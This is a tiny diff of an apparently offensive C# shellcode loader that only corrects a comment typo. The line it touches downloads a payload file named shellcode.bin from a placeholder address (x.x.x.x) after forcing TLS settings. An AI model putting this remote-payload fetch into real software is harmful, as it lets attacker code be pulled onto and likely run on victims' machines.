@@ -175,7 +175,7 @@ public class Program
 
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
 
-            shellcode = client.DownloadData("https://x.x.x.x/shellcode.bin");  //IP address the shellcode
+            shellcode = client.DownloadData("https://x.x.x.x/shellcode.bin");  //IP address of the shellcode
         }
 
 
